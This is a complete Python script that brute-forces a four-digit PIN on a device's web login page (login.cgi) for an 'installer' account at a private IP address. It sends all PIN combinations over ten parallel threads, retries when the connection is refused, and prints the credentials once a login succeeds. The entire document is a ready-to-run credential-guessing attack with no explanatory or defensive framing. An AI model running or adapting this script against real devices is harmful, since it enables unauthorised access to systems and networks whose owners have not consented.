#!/usr/bin/python3
# Imports
import time
import requests
from datetime import datetime
from multiprocessing.dummy import Pool

# Variables
username = "installer"
ipaddr = "10.5.104.150"
charNumbers = 4

# Data
mainUrl = str("http://" + ipaddr + "/login.cgi")
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

# Definitions
startTime = datetime.now()

# Code
def req_split(pin):
    params = {'lgname': username, 'lgpin': str(pin).zfill(charNumbers) }
    r = ''
    while r == '':
        try:
            print("Pin Code: " + str(pin).zfill(charNumbers))
            r = requests.post(mainUrl,data=params,headers=headers,allow_redirects=False)
            if r.status_code == 200:
                print("========================")
                print("Successful Login!")
                print("The username was: " + username)
                print("The password was: " + str(pin).zfill(charNumbers) + ".")
                print("The script took " + str(datetime.now() - startTime) + " seconds to complete.")
                
        except requests.exceptions.ConnectionError:
            print("Connection Refused by the server.")
            print("Retrying in 5 seconds.")
            time.sleep(4.9)
            continue

pinCode = range(0,9999)

with Pool(10) as p:
    pm = p.imap_unordered(req_split, pinCode)
    pm = [i for i in pm if i]
